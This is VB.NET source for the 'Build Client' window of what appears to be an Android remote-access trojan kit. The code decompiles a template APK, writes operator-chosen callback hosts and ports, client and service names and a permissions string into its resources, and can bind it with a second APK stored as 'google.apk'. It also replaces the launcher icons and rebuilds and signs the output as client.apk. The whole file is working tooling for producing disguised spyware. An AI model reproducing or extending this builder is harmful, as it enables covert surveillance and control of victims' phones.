﻿Imports System.ComponentModel
Imports System.IO.Compression
Public Class Build_client
    Private folder_Building As String
    Private folder_apktool As String
    Private Const name_static As String = "app-release"
    Dim start As System.DateTime
    Private Sub title(t As String, i As String)
        Dim title As String = String.Format(t, i)
        Text = title
    End Sub
    Dim boolen_exit As Boolean = False
    Private Sub Build_client_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        B0ToolStripMenuItem.Image = store_0.Bitmap_0("ctx_packg")
        ContextMenuStrip1.Renderer = New Theme_0

        GroupBox5.Text = Space(CheckBox1.Text.Length * 2)
        TabPage1.Text = "Output"



        TabPage2.Text = "Client Info"
        TabPage3.Text = "Dynamic DNS"
        TabPage4.Text = "Properties"
        TabPage5.Text = "Merging App"
        NumericUpDown1.Value = My.Settings.SVPORT



        TextBox1.Text = My.Settings.SVHOST
        TextBox2.Text = My.Settings.BIINFO2
        TextBox3.Text = My.Settings.BIINFO3
        TextBox4.Text = My.Settings.BIINFO4
        TextBox5.Text = My.Settings.BIINFO5
        Dim GroupProperties$ = My.Settings.LISTPROP

        For listh% = 0 To GroupProperties.Length - 1
            Dim firstChar As Char
            firstChar = GroupProperties(listh)
            If firstChar = "1" Then
                CheckedListBox1.SetItemChecked(listh, True)
            End If
        Next

        Dim svhost$ = My.Settings.SVLISTHOST.Trim
        If svhost.Contains(",") Then
            If svhost.EndsWith(",") Then
                svhost = svhost.ToString.Remove(svhost.ToString.Length - 1).ToString()
            End If
            Dim ary$() = svhost.Split(",")
            Dim b%
            For b = 0 To ary.Length - 1
                DataGridView1.Rows.Add(ary(b), If(IsNumeric(ary(b + 1)), ary(b + 1), "0"))
                b += 1
            Next
        End If




        MenuStrip1.Renderer = New Theme_0
        Me.Icon = store_0.icons_0("window")
        ErrorProvider1.Icon = store_0.icons_0("errors")
        PictureBox1.Image = store_0.Bitmap_0("icon_default")


        title("Build Client", Nothing) ' -idle time {0}
        'Me.MinimumSize = New System.Drawing.Size(346, 422)
        RichTextBox1.ContextMenuStrip = store_0.ContextMenu1

    End Sub
#Region " Steps "
    Private Sub step0()
        Dim j As Boolean = min()
        If j Then
            If cmd_running_cmd = False Then
                xx = cmd_running()
            End If


            If xx Then
                boolen_exit = True
                buildingToolStripMenuItem.Enabled = False
                step1()
            End If
        End If
    End Sub
    Private Sub step1()
        If xx Then
            cmd_0.StandardInput.WriteLine("java -version") 'تحقق من وجود جافا
        End If


    End Sub
    Private Sub step2()
        If xx Then
            cmd_0.StandardInput.WriteLine("cd " + folder_apktool) ' دخول في مسار
            step3()
            prog(10)
        End If

    End Sub
    Private Sub step3()


        If xx Then
            cmd_0.StandardInput.WriteLine("apktool d " + name_static + ".apk") ' فك تغليف
            'C:\Building\apktool\app-release\res\values\strings.xml

            prog(15)
            Dim th As System.Threading.Thread = New Threading.Thread(AddressOf re_a)
            th.IsBackground = True
            th.Start()
        End If

    End Sub
    Private Sub step4()
        If xx Then
            cmd_0.StandardInput.WriteLine("apktool b -f -r " + name_static) ' اعادة تغليف
            step5()
            prog(70)
        End If

    End Sub
    Private Sub step5()
        If xx Then
            cmd_0.StandardInput.WriteLine("java -jar SignApk.jar certificate.pem key.pk8 " + name_static + "\dist\" + name_static + ".apk " + "out\client" + ".apk") ' توقيع
            prog(80)

        End If
    End Sub
    Private Sub step6(b As Boolean)
        While (b)
            Threading.Thread.Sleep(store_0.CPU)
            If System.IO.File.Exists(folder_apktool + "\out\client" + ".apk") Then
                Process.Start(folder_apktool + "\out")
                Dim finish As System.DateTime = System.DateTime.Now()
                Dim span As System.TimeSpan = finish - start

                prog(100)
                title("Build Client  -idle time {0}", span.Minutes & "m" & span.Seconds & "s" & span.Milliseconds & "ms".ToString) '
                ToolStripMenuItem1.Visible = True
                ToolStripMenuItem1.Text = String.Format("idle time {0}", span.Minutes & "m" & span.Seconds & "s" & span.Milliseconds & "ms".ToString)
                boolen_exit = False
                buildingToolStripMenuItem.Enabled = True


                Exit While
            End If
        End While
        Exit Sub
    End Sub
#End Region
    Private Sub re_a()
        While (xx)
back_2:
            Threading.Thread.Sleep(store_0.CPU)
            Dim p As String = folder_apktool & "\" + name_static + "\res\values\strings.xml"
            If System.IO.File.Exists(p) Then
                Try
                    Dim GroupDns$ = Nothing
                    If DataGridView1.Rows.Count > 0 Then
                        For r% = 0 To DataGridView1.Rows.Count - 1
                            GroupDns += DataGridView1.Rows(r).Cells(0).Value + "," + DataGridView1.Rows(r).Cells(1).Value + ","
                        Next
                    End If
                    If GroupDns.EndsWith(",") Then
                        GroupDns = GroupDns.ToString.Remove(GroupDns.ToString.Length - 1).ToString()
                    End If

                    '#
                    Dim GroupProperties$ = Nothing
                    For idx As Integer = 0 To Me.CheckedListBox1.Items.Count - 1
                        GroupProperties += CStr(CheckedListBox1.GetItemCheckState(idx))
                    Next

                    Dim che% = 0
                    If CheckBox1.Checked = True Then che = 1



                    My.Settings.SVLISTHOST = GroupDns
                    My.Settings.Save()
                    Dim readall_0 As String = My.Computer.FileSystem.ReadAllText(p).Replace("[0x0x0x0_Host_0x0x0x0]", GroupDns).Replace("[0x0x0x0_Client_Name_0x0x0x0]", TextBox2.Text).Replace("[0x0x0x0_App_Name_0x0x0x0]", TextBox3.Text).Replace("[0x0x0x0_Service_Name_0x0x0x0]", TextBox4.Text).Replace("[0x0x0x0_Version_0x0x0x0]", TextBox5.Text).Replace("[0x0x0x0_Group_Properties_0x0x0x0]", GroupProperties).Replace("[0x0x0x0_Merge_file_0x0x0x0]", CStr(che)).Replace("[0x0x0x0_Package_file_0x0x0x0]", TextBox7.Text)
                    IO.File.WriteAllText(p, readall_0)
                    '

                    If CheckBox1.Checked = False Then GoTo ex_0






                Catch ex As Exception
                    GoTo back_2
                End Try


vbBack:
                Threading.Thread.Sleep(store_0.CPU)
                Try
                    If TextBox6.Text.Length > 0 And TextBox7.Text.Length > 0 Then
                        Dim rep$ = folder_apktool & "\" + name_static + "\res\raw\google.apk"
                        If System.IO.File.Exists(rep) Then
                            System.IO.File.Delete(rep)
                            Dim p6$ = TextBox6.Text
                            If System.IO.File.Exists(p6) Then
                                System.IO.File.Copy(p6, rep)
                            End If
                            GoTo ex_0
                        Else
                            GoTo vbBack
                        End If
                    Else
                        GoTo ex_0
                    End If
                Catch ex As Exception
                    GoTo vbBack
                End Try




            End If
        End While
ex_0:
        prog(20)

#Region " icons "
        While (xx)
back_3:
            Threading.Thread.Sleep(store_0.CPU)
            Dim m_72 As String = folder_apktool & "\" + name_static + "\res\mipmap-hdpi-v4\ic_launcher.png"
            If System.IO.File.Exists(m_72) Then
                Try
                    System.IO.File.Delete(m_72)
                    Image_scaling(72, 72, m_72)
                    GoTo ex_1
                Catch ex As Exception
                    GoTo back_3
                End Try
            End If
        End While
        prog(25)
ex_1:

        While (xx)
back_4:
            Threading.Thread.Sleep(store_0.CPU)
            Dim m_48 As String = folder_apktool & "\" + name_static + "\res\mipmap-mdpi-v4\ic_launcher.png"
            If System.IO.File.Exists(m_48) Then
                Try
                    System.IO.File.Delete(m_48)
                    Image_scaling(48, 48, m_48)
                    GoTo ex_2
                Catch ex As Exception
                    GoTo back_4
                End Try
            End If
        End While
        prog(30)
ex_2:
        While (xx)
back_5:
            Threading.Thread.Sleep(store_0.CPU)
            Dim m_96 As String = folder_apktool & "\" + name_static + "\res\mipmap-xhdpi-v4\ic_launcher.png"
            If System.IO.File.Exists(m_96) Then
                Try
                    System.IO.File.Delete(m_96)
                    Image_scaling(96, 96, m_96)
                    GoTo ex_3
                Catch ex As Exception
                    GoTo back_5
                End Try
            End If
        End While
        prog(35)
ex_3:
        While (xx)
back_6:
            Threading.Thread.Sleep(store_0.CPU)
            Dim m_96 As String = folder_apktool & "\" + name_static + "\res\mipmap-xhdpi-v4\ic_launcher.png"
            If System.IO.File.Exists(m_96) Then
                Try
                    System.IO.File.Delete(m_96)
                    Image_scaling(96, 96, m_96)
                    GoTo ex_4
                Catch ex As Exception
                    GoTo back_6
                End Try
            End If
        End While
        prog(40)
ex_4:
        While (xx)
back_7:
            Threading.Thread.Sleep(store_0.CPU)
            Dim m_144 As String = folder_apktool & "\" + name_static + "\res\mipmap-xxhdpi-v4\ic_launcher.png"
            If System.IO.File.Exists(m_144) Then
                Try
                    System.IO.File.Delete(m_144)
                    Image_scaling(144, 144, m_144)
                    GoTo ex_5
                Catch ex As Exception
                    GoTo back_7
                End Try
            End If
        End While
        prog(45)
ex_5:
        While (xx)
back_8:
            Threading.Thread.Sleep(store_0.CPU)
            Dim m_192 As String = folder_apktool & "\" + name_static + "\res\mipmap-xxxhdpi-v4\ic_launcher.png"
            If System.IO.File.Exists(m_192) Then
                Try
                    System.IO.File.Delete(m_192)
                    Image_scaling(192, 192, m_192)
                    GoTo ex_6
                Catch ex As Exception
                    GoTo back_8
                End Try
            End If
        End While
        prog(50)
ex_6:
        If xx Then
            step4()
        End If

        Exit Sub
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Dim filrer_0 As String = "png Files (*.png)|*.png"
            OpenFileDialog1.Filter = filrer_0
            OpenFileDialog1.FileName = Nothing
            If OpenFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
                PictureBox1.ImageLocation = OpenFileDialog1.FileName

                PictureBox1.Tag = OpenFileDialog1.FileName

            Else
                Exit Sub
            End If
        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try
    End Sub
    Private Sub Image_scaling(w_00, h_00, n_00)
        Try
            If xx Then


                Dim p_00 As String = PictureBox1.Tag
                Dim b_00 As New Bitmap(p_00)
                Dim width As Integer = w_00
                Dim height As Integer = h_00
                Dim t As New Bitmap(width, height)
                Dim g As Graphics = Graphics.FromImage(t)
                g.InterpolationMode = Drawing2D.InterpolationMode.Low
                g.DrawImage(b_00, New Rectangle(0, 0, width, height), New Rectangle(0, 0, b_00.Width, b_00.Height), GraphicsUnit.Pixel)
                g.Dispose()
                t.Save(n_00, System.Drawing.Imaging.ImageFormat.Png)
                b_00.Dispose()
                t.Dispose()
            End If
        Catch ex As Exception

            'MsgBox(ex.ToString)

        End Try
    End Sub
#End Region




#Region " cmd "
    Private cmd_0 As Object
    Private xx As Boolean = False
    Private cmd_running_cmd As Boolean = False
    Function cmd_running() As Boolean
        Try





            cmd_0 = New Process
            cmd_0.StartInfo.RedirectStandardOutput = True
            cmd_0.StartInfo.RedirectStandardInput = True
            cmd_0.StartInfo.RedirectStandardError = True
            cmd_0.StartInfo.FileName = "cmd.exe"
            cmd_0.StartInfo.RedirectStandardError = True
            AddHandler CType(cmd_0, Process).OutputDataReceived, AddressOf Sync_Output
            AddHandler CType(cmd_0, Process).ErrorDataReceived, AddressOf Sync_Output
            AddHandler CType(cmd_0, Process).Exited, AddressOf ex
            cmd_0.StartInfo.UseShellExecute = False
            cmd_0.StartInfo.CreateNoWindow = True
            cmd_0.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            cmd_0.EnableRaisingEvents = True
            cmd_0.Start()
            cmd_0.BeginErrorReadLine()
            cmd_0.BeginOutputReadLine()

            cmd_running_cmd = True
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Delegate Sub prg(ByVal v%)
    Sub prog(v%)
        If Me.InvokeRequired Then
            Dim inv As New prg(AddressOf prog)
            Me.Invoke(inv, New Object() {v})
            Exit Sub
        End If
        ProgressBar1.Value = (v)
    End Sub
    Delegate Sub inv_cmd(ByVal d0 As Object, b0 As Object)
    Public Sub Sync_Output(ByVal d01 As Object, ByVal b01 As Object)
        Try
            If Me.InvokeRequired Then
                Dim inv As New inv_cmd(AddressOf Sync_Output)
                Me.Invoke(inv, New Object() {d01, b01})
                Exit Sub
            Else
                If b01.Data.ToString.Contains("Java(TM) SE Runtime Environment") Then
                    prog(5)
                    step2()
                ElseIf b01.data.ToString.Contains("java -jar SignApk.jar") Then
                    prog(80)
                    Dim th As System.Threading.Thread = New Threading.Thread(AddressOf step6)
                    th.IsBackground = True
                    th.Start(xx)
                Else
                    If ProgressBar1.Value = 0 Then
                        If b01.Data.ToString.Contains("'java -version' is not") Or b01.Data.ToString.Contains("'java' is not") Then
                            boolen_exit = False
                            buildingToolStripMenuItem.Enabled = True
                        End If
                    End If
                End If
                RichTextBox1.AppendText(b01.Data.ToString & Environment.NewLine)
                RichTextBox1.ScrollToCaret()
            End If
        Catch ex As Exception

            'If xx Then
            '    close_cmd()
            'End If
        End Try
    End Sub
    Private Sub ex()
        If xx Then
            MsgBox("cmd.exe Unexpectedly closed !!", MsgBoxStyle.Critical, store_0.name_prog)
            Threading.Thread.Sleep(5000)
            close_cmd()
        End If
    End Sub
    Private Sub Build_client_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        e.Cancel = boolen_exit



        If boolen_exit = False Then
            If xx Then
                close_cmd()
            End If


        End If



    End Sub



    Private Sub close_cmd()
        'If xx Then


        cmd_running_cmd = False


        xx = False



        Try
            Try

                cmd_0.CancelOutputRead()

            Catch ex As Exception

            End Try

            Try
                cmd_0.CancelErrorRead()
            Catch ex As Exception

            End Try





            Try
                cmd_0.Kill()

            Catch ex As Exception
            End Try


            Try
                cmd_0.Close()
            Catch ex As Exception
            End Try


        Catch ex As Exception
            'MsgBox(ex.ToString)
        End Try

        cmd_0 = Nothing
        boolen_exit = False
        Me.Close()
        'End If
    End Sub

#End Region




    Public Function getDriv()
        Try
            Dim p As String = Application.ExecutablePath
            Dim F() As String = {"\"}
            Dim ar() As String = p.Split(F, StringSplitOptions.RemoveEmptyEntries)
            Return ar(0).ToString + "\"
        Catch
            Return "C:\"
        End Try
    End Function

    Private Function min() As Boolean

        title("Build Client", Nothing) ' -idle time {0}
        'Step 1
        start = System.DateTime.Now()
Back_1:
        Threading.Thread.Sleep(store_0.CPU)
        Dim driv As String = getDriv()
        folder_Building = driv + "Building"
        folder_apktool = driv + "Building\apktool"
        Try
            If Not My.Computer.FileSystem.DirectoryExists(folder_Building) Then
                My.Computer.FileSystem.CreateDirectory(folder_Building)
                GoTo Back_1
            End If
            If Not My.Computer.FileSystem.DirectoryExists(folder_apktool) Then
                File_zip_Decompress(Application.StartupPath & "\" & store_0.name_folder_app_resource & "\apktool\apktool.zip", folder_Building & "\")
                GoTo Back_1
            End If
            'Step 2
            If My.Computer.FileSystem.DirectoryExists(folder_Building) And My.Computer.FileSystem.DirectoryExists(folder_apktool) Then

                If My.Computer.FileSystem.DirectoryExists(folder_apktool + "\" + name_static) Then
                    Dim path As String = folder_apktool + "\" + name_static
                    System.IO.Directory.Delete(path, True)
                    GoTo Back_1
                Else
                    Return True
                End If
            Else
                GoTo Back_1
            End If

        Catch ex As Exception
            Return False
            'MsgBox(ex.ToString)
            Exit Function
        End Try

    End Function
    Private Sub File_zip_Decompress(zipPath As String, pathfolder As String)
        Try
            If (Not System.IO.Directory.Exists(pathfolder)) Then
                System.IO.Directory.CreateDirectory(pathfolder)
            End If
            ZipFile.ExtractToDirectory(zipPath, pathfolder)
        Catch ex As Exception
            'MsgBox(ex.ToString)
            Exit Sub
        End Try

    End Sub

    Private Sub B0ToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles B0ToolStripMenuItem.Click
        Try
            'DataGridView1
            Me.ErrorProvider1.Clear()
            Dim ErrorCounter% = 0
            If DataGridView1.Rows.Count <= 0 Then
                Me.ErrorProvider1.SetError(DataGridView1, "Cannot be Empty")
            Else
                Me.ErrorProvider1.SetError(DataGridView1, Nothing)
                ErrorCounter += 1
            End If
            For Each ctrl As Control In GroupBox2.Controls
                If TypeName(ctrl) = "TextBox" Then
                    If ctrl.Tag = "ERROR" Then
                        If ctrl.Text.Length = 0 Then
                            Me.ErrorProvider1.SetError(ctrl, "Cannot be Empty")
                        Else
                            Me.ErrorProvider1.SetError(ctrl, Nothing)
                            ErrorCounter += 1
                        End If
                    End If
                End If
            Next

            If CheckBox1.Checked = True Then

                If TextBox6.Text.Length = 0 Then
                    Me.ErrorProvider1.SetError(TextBox6, "Cannot be Empty")
                Else
                    Me.ErrorProvider1.SetError(TextBox6, Nothing)
                    ErrorCounter += 1
                End If

                If TextBox7.Text.Length = 0 Then

                    Me.ErrorProvider1.SetError(TextBox7, "Cannot be Empty")
                Else
                    Me.ErrorProvider1.SetError(TextBox7, Nothing)
                    ErrorCounter += 1
                End If
            Else
                Me.ErrorProvider1.SetError(TextBox6, Nothing)
                Me.ErrorProvider1.SetError(TextBox7, Nothing)
                ErrorCounter += 2
            End If



            If ErrorCounter = 7 Then

                Dim filrer_0 As String = "apk Files (*.apk)|*.apk"
                OpenFileDialog1.Filter = filrer_0
                OpenFileDialog1.FileName = Nothing
                If OpenFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
                    If PictureBox1.Tag = Nothing Then
                        PictureBox1.Tag = Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\icon_default.png"
                    End If
                    Dim j As Boolean = min()
                    If j Then
                        If System.IO.File.Exists(folder_apktool & "\" + name_static + ".apk") Then
                            System.IO.File.Delete(folder_apktool & "\" + name_static + ".apk")
                        End If
                        If System.IO.File.Exists(folder_apktool & "\out\client.apk") Then
                            System.IO.File.Delete(folder_apktool & "\out\client.apk")
                        End If
                        System.IO.File.Copy(OpenFileDialog1.FileName, folder_apktool & "\" + name_static + ".apk")
                        ToolStripMenuItem1.Visible = False


                        My.Settings.SVHOST = TextBox1.Text
                        My.Settings.BIINFO2 = TextBox2.Text
                        My.Settings.BIINFO3 = TextBox3.Text
                        My.Settings.BIINFO4 = TextBox4.Text
                        My.Settings.BIINFO5 = TextBox5.Text


                        Dim GroupProperties$ = Nothing
                        For idx As Integer = 0 To Me.CheckedListBox1.Items.Count - 1
                            GroupProperties += CStr(CheckedListBox1.GetItemCheckState(idx))
                        Next
                        My.Settings.LISTPROP = GroupProperties

                        My.Settings.Save()
                        step0()

                    End If

                Else
                    Exit Sub
                End If
            End If

nx:
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, store_0.name_prog)
        End Try
    End Sub



    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click


        If Not TextBox1.Text = Nothing And Not CStr(NumericUpDown1.Value) = "0" Then
            DataGridView1.Rows.Add(TextBox1.Text, CStr(NumericUpDown1.Value))
        End If



    End Sub


    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        PictureBox1.Image = store_0.Bitmap_0("icon_default")
        PictureBox1.Tag = Application.StartupPath & "\" & name_folder_app_resource & "\icons\icon_diverse\icon_default.png"

    End Sub

    Private Sub Build_client_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        ErrorProvider1.Clear()
    End Sub

    Private Sub CheckedListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CheckedListBox1.SelectedIndexChanged

    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click




        Dim filrer_0 As String = "apk Files (*.apk)|*.apk"
        OpenFileDialog1.Filter = filrer_0
        OpenFileDialog1.FileName = Nothing
        If OpenFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then


            'If System.IO.File.Exists(folder_apktool & "\" + name_static + ".apk") Then
            '    System.IO.File.Delete(folder_apktool & "\" + name_static + ".apk")
            'End If
            'If System.IO.File.Exists(folder_apktool & "\out\client.apk") Then
            '    System.IO.File.Delete(folder_apktool & "\out\client.apk")
            'End If

            If System.IO.File.Exists(OpenFileDialog1.FileName) Then
                'Dim inf As New System.IO.FileInfo(OpenFileDialog1.FileName.ToString)
                TextBox6.Text = OpenFileDialog1.FileName.ToString
                'DataGridView2.Rows.Add(inf.Name.ToString, OpenFileDialog1.FileName)
            End If


        Else
            TextBox6.Text = Nothing
            Exit Sub
        End If

    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click

        TextBox6.Text = Nothing
        TextBox7.Text = Nothing
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            Panel5.Enabled = True
        Else
            Panel5.Enabled = False
        End If
    End Sub

    Private Sub buildingToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles buildingToolStripMenuItem.Click

    End Sub

    Private Sub RemoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveToolStripMenuItem.Click
        If DataGridView1.SelectedRows.Count > 0 Then
            For i As Integer = DataGridView1.SelectedRows.Count - 1 To 0 Step -1

                DataGridView1.Rows.RemoveAt(DataGridView1.SelectedRows(i).Index)
            Next
        End If
    End Sub

    Private Sub DataGridView1_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellContentClick

    End Sub





    'Private Sub CheckedList()
    '    If CheckedListBox1.GetItemCheckState(5) Then
    '        GroupBox5.Enabled = True
    '    Else
    '        GroupBox5.Enabled = False
    '    End If

    'End Sub

    'Private Sub CheckedListBox1_MouseUp(sender As Object, e As MouseEventArgs) Handles CheckedListBox1.MouseUp
    '    CheckedList()
    'End Sub

    'Private Sub CheckedListBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles CheckedListBox1.KeyPress
    '    CheckedList()
    'End Sub

    'Private Sub CheckedListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles CheckedListBox1.SelectedIndexChanged

    'End Sub
End Class
